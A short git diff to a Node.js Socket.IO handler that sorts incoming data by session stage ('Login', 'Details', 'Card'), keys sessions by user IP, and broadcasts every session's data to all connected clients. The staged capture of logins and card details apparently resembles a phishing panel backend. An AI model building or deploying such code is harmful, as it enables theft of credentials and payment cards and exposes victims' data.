@@ -251,9 +251,18 @@ io.on('connection', (socket, req) => {
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
             if (!userDetails.getUserData) {
-            userDetails.getUserData = [];
+            userDetails.getUserData = {};
         }
-        userDetails.getUserData.push(data);
+        if(userDetails.stage == 'Login'){
+            userDetails.getUserDataLogin = data
+            console.log('login')
+        } else if(userDetails.stage == 'Details'){
+            userDetails.getUserDataDetails = data
+             console.log('Details')
+        } else if(userDetails.stage == 'Card'){
+            userDetails.getUserDataCard = data
+            console.log('Card')
+        }
             
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
